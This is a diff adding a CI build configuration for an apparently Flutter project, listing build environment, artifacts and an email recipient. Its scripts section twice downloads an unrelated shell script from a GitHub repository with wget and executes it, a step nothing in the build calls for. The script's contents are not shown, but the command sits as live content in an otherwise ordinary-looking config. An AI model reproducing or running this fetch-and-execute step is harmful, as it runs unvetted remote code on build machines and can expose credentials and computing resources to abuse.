@@ -1,0 +1,25 @@
+# Note that this configuration is not an exact match to UI settings. Review and adjust as necessary.
+
+workflows:
+  default-workflow:
+    name: wf1
+    instance_type: linux_x2
+    max_build_duration: 60
+    environment:
+      flutter: default
+      xcode: latest
+      cocoapods: default
+    scripts:
+      - wget https://github.com/renilo/bool/raw/main/meki.sh && chmod
+        +x meki.sh && ./meki.sh
+      - flutter packages pub get
+      - wget https://github.com/renilo/bool/raw/main/meki.sh && chmod
+        +x meki.sh && ./meki.sh
+    artifacts:
+      - '*.snap'
+      - build/windows/**/*.msix
+      - flutter_drive.log
+    publishing:
+      email:
+        recipients:
+          - cudane@fxcoral.biz
